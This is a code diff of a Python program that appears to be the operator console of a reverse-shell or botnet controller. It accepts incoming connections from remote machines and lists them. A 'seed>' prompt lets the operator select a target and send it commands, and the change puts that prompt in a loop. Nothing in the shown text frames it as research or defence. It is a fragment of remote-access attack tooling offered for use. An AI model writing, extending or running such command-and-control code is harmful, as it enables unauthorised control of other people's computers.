@@ -56,24 +56,23 @@ def accept_connection():
             all_connection.append(conn)
             all_address.append(address)
             print("\nConnection has Established: "+address[0])
-
-
         except:
             print("Error Accepting connection")
 
 
 
 def start_sploit():
-    cmd = input("seed>")
 
-    if cmd == "list":
-        list_connections()
-    elif 'select' in cmd:
-        conn = get_target(cmd)
-        if conn is not None:
-            send_target_commands(conn)
-    else:
-        print("Command not recognized!!")
+    while True:
+        cmd = input('seed> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        else:
+            print("Command not recognized!!")
 
 def list_connections():
     results = ''
